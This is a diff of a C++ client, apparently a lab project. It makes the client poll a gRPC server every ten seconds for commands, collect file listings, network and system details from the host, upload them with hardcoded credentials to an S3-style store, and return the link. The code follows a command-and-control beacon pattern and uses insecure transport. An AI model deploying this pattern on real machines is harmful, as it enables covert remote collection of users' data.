@@ -55,6 +55,52 @@ private:
     std::unique_ptr<com::ComService::Stub> stub_;
 };
 
+std::string MyUploadS3(std::string dataCommand,std::string nameObject) {
+    std::ofstream Report("C:/Users/Kirill/source/Work2/MainClient/data.txt", std::ios_base::binary);
+    if (!Report.is_open()) {
+        std::cerr << "Error opening file for writing." << std::endl;
+        exit(1);
+    }
+    Report.write(dataCommand.c_str(), dataCommand.size());
+    if (Report.fail()) {
+        std::cerr << "Error writing to file." << std::endl;
+        Report.close();
+        exit(1);
+    }
+    Report.close();
+
+    Aws::SDKOptions options;
+    Aws::InitAPI(options);
+    {
+        //Конфигурация клиента
+        Aws::Client::ClientConfiguration Config;
+        Config.scheme = Aws::Http::Scheme::HTTP;
+        Config.endpointOverride = "localhost:9000";
+        Aws::Auth::AWSCredentials credentials("qwerty123", "qwerty1234");
+        Aws::S3::S3Client s3_client(credentials, Config, Aws::Client::AWSAuthV4Signer::PayloadSigningPolicy::Never, false);
+
+        //Запрос
+        Aws::S3::Model::PutObjectRequest Request;
+        Request.SetBucket("mybucket");
+        Request.SetKey(nameObject);
+        auto data = Aws::MakeShared<Aws::FStream>("SampleAllocationTag", "C:/Users/Kirill/source/Work2/MainClient/data.txt", std::ios_base::in | std::ios_base::binary);
+        Request.SetBody(data);
+
+        //Отправка запроса
+        auto Send = s3_client.PutObject(Request);
+        if (Send.IsSuccess()) {
+            std::cout << "File uploaded successfully!" << std::endl;
+            std::string fileUrl = "http://localhost:9000/mybucket/" + nameObject;
+            return fileUrl;
+        }
+        else {
+            std::cout << "Error uploading file " << std::endl;
+            return "Error uploading file ";
+        }
+    }
+    Aws::ShutdownAPI(options);
+}
+
 std::string ReadFiles() {
     std::string namesFiles;
     std::string path = "C:/Users/Kirill";
@@ -114,71 +160,38 @@ std::string ReportInfo() {
     return info;
 }
 
-void MyUploadS3() {
-    Aws::SDKOptions options;
-    Aws::InitAPI(options);
-    {
-        //Конфигурация клиента
-        Aws::Client::ClientConfiguration Config;
-        Config.scheme = Aws::Http::Scheme::HTTP;
-        Config.endpointOverride = "localhost:9000";
-        Aws::Auth::AWSCredentials credentials("qwerty123", "qwerty1234");
-        Aws::S3::S3Client s3_client(credentials, Config, Aws::Client::AWSAuthV4Signer::PayloadSigningPolicy::Never, false);
-
-        //Запрос
-        Aws::S3::Model::PutObjectRequest Request;
-        Request.SetBucket("mybucket");
-        Request.SetKey("Report");
-        auto data = Aws::MakeShared<Aws::FStream>("SampleAllocationTag", "C:/Users/Kirill/source/Work2/MainClient/report.txt", std::ios_base::in | std::ios_base::binary);
-        Request.SetBody(data);
-
-        //Отправка запроса
-        auto Send = s3_client.PutObject(Request);
-        if (Send.IsSuccess()) {
-            std::cout << "File uploaded successfully!" << std::endl;
-        }
-        else {
-            std::cout << "Error uploading file " << std::endl;
-        }
-    }
-    Aws::ShutdownAPI(options);
-}
-
 int main(int argc, char** argv) {
     std::string target_str = "192.168.44.130:50051";
     CommandClient client(grpc::CreateChannel(target_str, grpc::InsecureChannelCredentials()));
-    std::string command = client.GetCommand();
-    std::cout << "Command: " << command << std::endl;
-    std::string response;
-    if (command == "Files") {
-        response = ReadFiles();
-    }
-    else if (command == "Network") {
-        response = ReadNetwork();
-    }
-    else if (command == "SystemInfo") {
-        response = ReadSystemInfo();
-    }
-    else if (command == "Report") {
-        response = ReportInfo();
-        std::ofstream Report("C:/Users/Kirill/source/Work2/MainClient/report.txt", std::ios_base::binary);
-        if (!Report.is_open()) {
-            std::cerr << "Error opening file for writing." << std::endl;
-            exit(1);
+    while (true) {
+        Sleep(10000);
+        std::string command = client.GetCommand();
+        std::cout << "Command: " << command << std::endl;
+        std::string response;
+        if (command == "Files") {
+            response = ReadFiles();
+            std::string link = MyUploadS3(response, "FilesCommand");
+            client.SendResponse(link);
         }
-        Report.write(response.c_str(), response.size());
-        if (Report.fail()) {
-            std::cerr << "Error writing to file." << std::endl;
-            Report.close();
-            exit(1);
+        else if (command == "Network") {
+            response = ReadNetwork();
+            std::string link = MyUploadS3(response, "NetworkCommand");
+            client.SendResponse(link);
         }
-        Report.close();
+        else if (command == "SystemInfo") {
+            response = ReadSystemInfo();
+            std::string link = MyUploadS3(response, "SystemInfoCommand");
+            client.SendResponse(link);
+        }
+        else if (command == "Report") {
+            response = ReportInfo();
+            std::string link = MyUploadS3(response, "ReportCommand");
+            client.SendResponse(link);
+        }
+        else {
+            response = "Unknown " + command;
+        }
     }
-    else {
-        response = "Unknown " + command;
-    }
-    client.SendResponse(response);
-    MyUploadS3();
     return 0;
 }
 
